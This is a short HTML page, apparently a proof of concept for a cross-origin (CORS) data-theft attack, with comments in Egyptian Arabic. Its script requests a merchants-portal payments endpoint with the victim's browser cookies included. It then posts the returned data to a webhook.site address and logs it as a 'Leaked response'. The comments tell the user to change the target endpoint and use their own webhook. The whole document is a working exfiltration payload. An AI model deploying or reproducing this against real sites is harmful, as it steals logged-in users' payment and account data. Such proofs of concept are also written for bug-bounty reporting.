<html>
  <body>
    <script>
      (async () => {
  const target = "/v1/merchants-portal/list/payments";  // غيره حسب endpoint الحساس

  const response = await fetch(target, {
    method: "GET",
    mode: "cors",
    credentials: "include" // ده بيخلي الكوكيز/الجلسة تتبعت من المتصفح
  });

  const result = await response.text();

  // ابعته إلى webhook بتاعك (مثلاً على webhook.site)
  fetch("https://webhook.site/b22a9114-c3b8-4f5e-a385-b2c865ac2421", {
    method: "POST",
    body: JSON.stringify({
      data: result,
      origin: location.origin,
      timestamp: new Date().toISOString()
    }),
    headers: {
      "Content-Type": "application/json"
    }
  });

  // لعرض مباشر في console
  console.log("Leaked response:", result);
})();
    </script>
  </body>
</html>
